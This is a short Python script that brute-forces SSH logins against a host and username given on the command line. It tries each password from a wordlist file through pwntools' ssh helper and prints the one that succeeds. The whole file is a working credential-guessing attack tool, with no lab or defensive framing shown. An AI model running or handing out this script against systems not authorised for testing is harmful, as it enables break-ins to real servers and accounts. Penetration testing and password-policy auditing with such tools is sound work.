import paramiko.ssh_exception
from pwn import *
import paramiko
import sys

if len(sys.argv) != 3:
    print("Invalid arguments")
    print("python3 <script_name> <host_name> <user_name>")
    exit()

host = sys.argv[1]
username = sys.argv[2]
attempts = 0

with open('ssh_passwords.txt', 'r') as password_list:
    for password in password_list:
        password = password.strip('\n')
        try:
            print("[{}] attempting password: [{}]".format(attempts, password))
            response = ssh(host = host, user = username, password = password, timeout = 2)
            if response.connected():
                print("Connection established with password: {}".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("Invalid Password")
        attempts += 1